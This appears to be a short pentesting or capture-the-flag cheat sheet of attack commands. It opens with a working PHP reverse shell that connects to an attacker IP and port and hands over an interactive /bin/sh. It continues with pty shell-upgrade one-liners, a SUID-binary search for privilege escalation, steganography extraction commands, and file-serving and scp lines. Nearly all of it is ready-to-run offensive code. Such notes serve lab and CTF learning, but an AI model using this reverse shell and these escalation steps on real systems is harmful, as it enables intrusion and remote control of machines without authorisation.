### PHP reverse shell payload

```php
<?php
$ip = '192.168.1.10';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

### Shell Upgrade:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Steganography

```bash
exiftool fileName.jpg
steghide extract -sf fileName.jpg
binwalk -e fileName.png
```

Binwalk fix:

```bash
sed -i 's/CS_ARCH_ARM64/CS_ARCH_AARCH64/g' /usr/lib/python3/dist-packages/binwalk/modules/disasm.py
```

### Python Simple Server

```bash
python -m SimpleHTTPServer
```

### Secure File Transfer

```bash
scp userName@IP:fileName.jpg .
```
